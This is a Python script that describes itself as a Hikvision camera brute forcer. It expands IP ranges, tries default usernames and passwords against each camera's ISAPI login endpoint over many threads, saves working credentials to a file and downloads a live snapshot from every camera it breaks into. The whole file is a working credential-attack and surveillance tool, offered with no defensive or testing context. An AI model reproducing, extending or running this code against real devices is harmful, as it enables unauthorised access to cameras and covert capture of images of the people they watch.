import requests
from requests.auth import HTTPDigestAuth
import concurrent.futures
import ipaddress
import os
import argparse
from datetime import datetime

# ASCII Art Logo
LOGO = """
 _   _ _ _    _                     _   _____      _               
| | | (_) | _(_)                   | | |_   _|    (_)              
| |_| | | |/ / | _____ _ __    __ _| |   | | _ __  _  ___ ___ _ __ 
|  _  | |   <| |/ / _ \ '_ \  / _` | |   | || '_ \| |/ __/ _ \ '__|
| | | | | |\  \   <  __/ | | | (_| | |  _| || | | | | (_|  __/ |   
|_| |_|_|_| \_\_|\_\___|_| |_|\__,_|_| |_____|_| |_|_|\___\___|_|  
"""

print(LOGO)
print("Hikvision Camera Brute Forcer")
print("=" * 50 + "\n")

# Configuration
DEFAULT_USERNAMES = ["admin", "Admin", "administrator", "root"]
DEFAULT_PASSWORDS = ["12345", "admin", "password", "123456", "1234", "123456789", "12345678", "admin1234"]
DEFAULT_THREADS = 20
TIMEOUT = 5
OUTPUT_FILE = "results.txt"
SCREENSHOTS_DIR = "cameras"

def load_ips_from_file(filename):
    """Load IP addresses from file"""
    if not os.path.exists(filename):
        print(f"[!] Error: IP file {filename} not found!")
        return []
    
    with open(filename, "r") as f:
        ips = []
        for line in f:
            line = line.strip()
            if line:
                # Try to parse as IP range
                if '/' in line or '-' in line:
                    try:
                        if '/' in line:
                            # CIDR notation
                            ips.extend(str(ip) for ip in ipaddress.IPv4Network(line, strict=False))
                        else:
                            # IP range (e.g., 192.168.1.1-192.168.1.100)
                            start, end = line.split('-')
                            start_ip = ipaddress.IPv4Address(start.strip())
                            end_ip = ipaddress.IPv4Address(end.strip())
                            while start_ip <= end_ip:
                                ips.append(str(start_ip))
                                start_ip += 1
                    except Exception as e:
                        print(f"[!] Invalid IP range format in line: {line} - {str(e)}")
                else:
                    # Single IP
                    ips.append(line)
    
    return list(set(ips))  # Remove duplicates

def generate_ips_from_range(ip_range):
    """Generate IP addresses from range"""
    ips = []
    try:
        if '/' in ip_range:
            # CIDR notation
            ips = [str(ip) for ip in ipaddress.IPv4Network(ip_range, strict=False)]
        elif '-' in ip_range:
            # IP range (e.g., 192.168.1.1-192.168.1.100)
            start, end = ip_range.split('-')
            start_ip = ipaddress.IPv4Address(start.strip())
            end_ip = ipaddress.IPv4Address(end.strip())
            while start_ip <= end_ip:
                ips.append(str(start_ip))
                start_ip += 1
        else:
            # Single IP
            ips.append(ip_range)
    except Exception as e:
        print(f"[!] Invalid IP range format: {ip_range} - {str(e)}")
    
    return ips

def check_camera(ip, username, password):
    try:
        # Try to access camera web interface
        url = f"http://{ip}/ISAPI/Security/userCheck"
        response = requests.get(url, auth=HTTPDigestAuth(username, password), timeout=TIMEOUT)
        
        if response.status_code == 200:
            print(f"[+] Found credentials: {ip} - {username}:{password}")
            
            # Save to results file
            with open(OUTPUT_FILE, "a") as f:
                f.write(f"{ip}:{username}:{password}\n")
            
            # Try to get a snapshot
            try:
                snapshot_url = f"http://{ip}/ISAPI/Streaming/channels/101/picture"
                snapshot_response = requests.get(
                    snapshot_url, 
                    auth=HTTPDigestAuth(username, password), 
                    timeout=TIMEOUT
                )
                
                if snapshot_response.status_code == 200:
                    filename = f"{SCREENSHOTS_DIR}/{ip.replace('.', '_')}_{username}.jpg"
                    with open(filename, "wb") as img_file:
                        img_file.write(snapshot_response.content)
                    print(f"[+] Saved screenshot for {ip} as {filename}")
            except Exception as e:
                print(f"[-] Could not get screenshot from {ip}: {str(e)}")
            
            return True
    except Exception as e:
        pass
    return False

def brute_force_ip(ip, usernames, passwords):
    print(f"[*] Checking IP: {ip}")
    for username in usernames:
        for password in passwords:
            if check_camera(ip, username, password):
                return

def main():
    parser = argparse.ArgumentParser(description="Hikvision Camera Brute Forcer")
    parser.add_argument("-i", "--ip", help="Single IP address or range (e.g., 192.168.1.1 or 192.168.1.0/24 or 192.168.1.1-192.168.1.100)")
    parser.add_argument("-f", "--file", help="File with IP addresses or ranges (one per line)")
    parser.add_argument("-u", "--users", help="File with usernames (one per line)")
    parser.add_argument("-p", "--passwords", help="File with passwords (one per line)")
    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS, 
                       help=f"Number of threads (default: {DEFAULT_THREADS})")
    args = parser.parse_args()

    # Load IPs
    ip_list = []
    if args.ip:
        ip_list.extend(generate_ips_from_range(args.ip))
    if args.file:
        ip_list.extend(load_ips_from_file(args.file))
    
    if not ip_list:
        print("[!] No IP addresses specified. Use -i/--ip or -f/--file")
        return
    
    # Load credentials
    usernames = DEFAULT_USERNAMES
    passwords = DEFAULT_PASSWORDS
    
    if args.users:
        if os.path.exists(args.users):
            with open(args.users, "r") as f:
                usernames = [line.strip() for line in f if line.strip()]
    
    if args.passwords:
        if os.path.exists(args.passwords):
            with open(args.passwords, "r") as f:
                passwords = [line.strip() for line in f if line.strip()]
    
    print("[*] Starting Hikvision camera brute forcer")
    print(f"[*] IP addresses loaded: {len(ip_list)}")
    print(f"[*] Usernames: {', '.join(usernames[:3])}..." if len(usernames) > 3 else ', '.join(usernames))
    print(f"[*] Passwords: {', '.join(passwords[:3])}..." if len(passwords) > 3 else ', '.join(passwords))
    print(f"[*] Threads: {args.threads}")
    print(f"[*] Results will be saved to {OUTPUT_FILE}")
    print(f"[*] Screenshots will be saved to {SCREENSHOTS_DIR}/")
    print("=" * 50 + "\n")
    
    # Create directories if they don't exist
    os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
    
    # Clear previous results
    open(OUTPUT_FILE, "w").close()
    
    # Start brute forcing with threads
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        # Using lambda to pass additional arguments
        executor.map(lambda ip: brute_force_ip(ip, usernames, passwords), ip_list)
    
    print("\n[+] Brute force completed. Check results.txt for credentials.")

if __name__ == "__main__":
    main()
